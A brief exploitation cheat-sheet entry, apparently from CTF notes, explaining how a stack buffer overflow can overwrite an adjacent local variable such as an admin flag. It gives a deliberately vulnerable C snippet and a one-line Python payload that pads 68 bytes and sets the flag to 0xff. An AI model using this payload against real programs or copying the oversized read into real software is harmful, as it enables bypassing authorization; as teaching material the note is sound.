# Local Variable Overwrite

Overflow past a buffer to overwrite an adjacent local variable (not the return address).

**When:** A critical variable (auth flag, admin status) is declared after a small buffer on the stack. Overflow the buffer to control the variable.

```c
char name[64];
int is_admin = 0;
wgetnstr(menu, name, 200);  // reads 200 bytes into 64-byte buffer!
if (is_admin == 0xff) secret();
```

```python
# Padding to reach is_admin + set to 0xff
io.sendline(b"E"*68 + b'\xff')
```
